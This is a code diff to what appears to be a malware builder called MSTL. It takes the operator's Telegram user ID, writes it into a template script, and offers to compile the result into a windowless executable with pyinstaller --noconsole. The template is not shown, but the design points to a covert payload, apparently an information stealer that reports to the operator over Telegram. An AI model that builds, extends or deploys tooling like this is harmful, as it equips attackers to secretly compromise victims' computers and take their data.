@@ -1,4 +1,5 @@
 from colorama import init, Fore
+from os import system
 init()
 def banner():
     from random import randint
@@ -70,10 +71,25 @@ MMM  M'  "MMM      "YMmMY"          MMM        ;;;;;YUMMM
     os.system('cls' if os.name == 'nt' else 'clear')
     print(Fore.CYAN + banners[randint(0, 3)])
 def make_python(ID):
-    from os import system 
-    with open("MSTL/Files/info.log", "w") as writer: writer.write(ID)
-    print(Fore.GREEN + "Python file is ready in MSTL directory.")
+    with open("MSTL/mstl.py", "r") as read: 
+        text = read.readlines()
+        text = "".join(text).replace("TELEGRAM_ID", ID)
+    system("mkdir output")
+    with open("output/mstl.py", "w") as write:
+        write.write(text)
+    print(Fore.GREEN + "File is created in /output directory.")
+def make_exe(): 
+    system("mkdir output/exe")
+    system("pyinstaller --noconsole --distpath output/exe output/mstl.py")
+    print(Fore.GREEN + ".exe application is created in /output/exe/mstl")
 banner()
-try: id = str(input(Fore.GREEN + "write your telegram user id(with @userinfobot): "))
+try: 
+    id = str(input(Fore.GREEN + "[+]" + Fore.WHITE + " write your telegram user id(with @userinfobot): "))
+    make_python(ID=id)
+    opt = input(Fore.YELLOW + "Make it exe(Y for yes and N for no)? " + Fore.RESET).lower()
+    if opt == "y": 
+        make_exe()
+    else: 
+        exit(Fore.CYAN + "\n\n Good Luck \n\n" + Fore.RESET)
 except ValueError: print(Fore.RED + "You must write str."), exit()
-make_python(ID=id)
+except KeyboardInterrupt: exit("\n\n\nGood Luck\n\n")
